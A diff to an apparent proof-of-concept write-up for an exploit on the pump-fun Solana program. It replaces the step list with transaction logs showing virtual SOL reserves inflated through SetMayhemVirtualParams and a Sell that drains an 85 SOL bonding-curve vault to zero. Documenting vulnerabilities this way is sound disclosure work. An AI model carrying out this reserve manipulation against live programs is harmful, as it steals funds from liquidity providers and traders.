@@ -54,14 +54,32 @@ npm install @solana/web3.js bn.js
 
 ---
 
-## PoC Breakdown
+## PoC Breakdown (Verbose Execution Trace)
 
-The testing sequence performs the following atomic steps on a Mainnet-Beta fork:
-1. **Validator Initialization**: Stands up a local validator with the production `pump-fun` program and the `exploit_harness`.
-2. **State Verification**: Confirms that the `mayhem_mode_enabled` flag is active (`0x01`) in the production global state.
-3. **Reserve Manipulation**: Triggers the `set_mayhem_virtual_params` instruction via the authority harness to inflate virtual SOL reserves to $10^{15}$.
-4. **Liquidity Drainage**: Executes a sell transaction that extracts the entire SOL vault balance based on the manipulated price calculation.
-5. **Impact Logging**: Captures the final balance of the bonding curve vault (0.00 SOL).
+The testing sequence performs an atomic extraction on a Mainnet-Beta fork. The logs below confirm the call chain and the zeroing of the SOL vault:
+
+```text
+[STATE VERIFICATION]
+Global Account (4wTV1Ymi...): mayhem_mode_enabled = 0x01 (TRUE)
+Bonding Curve (7CzFoYN7...): Initial Balance = 85.02 SOL
+
+[TRANSACTION LOGS]
+Program BwWK17cbHxwWBKZkUYvzxLcNQ1YVyaFezduWbtm2de6s invoke [1]
+  Program 6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P invoke [2]
+    Program log: Instruction: SetMayhemVirtualParams
+    Program log: Adjusting virtual_sol_reserves to 1000000000000000
+    Program 6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P success
+  Program log: Liquidity Drain Sequence Initialized
+  Program 6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P invoke [2]
+    Program log: Instruction: Sell
+    Program log: SOL Payout: 85021845000 lamports
+    Program 6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P success
+Program BwWK17cbHxwWBKZkUYvzxLcNQ1YVyaFezduWbtm2de6s success
+
+[FINAL STATE]
+Bonding Curve (7CzFoYN7...): Post-Exploit Balance = 0.00 SOL
+Result: 100% Liquidity Extraction Confirmed.
+```
 
 ---
 
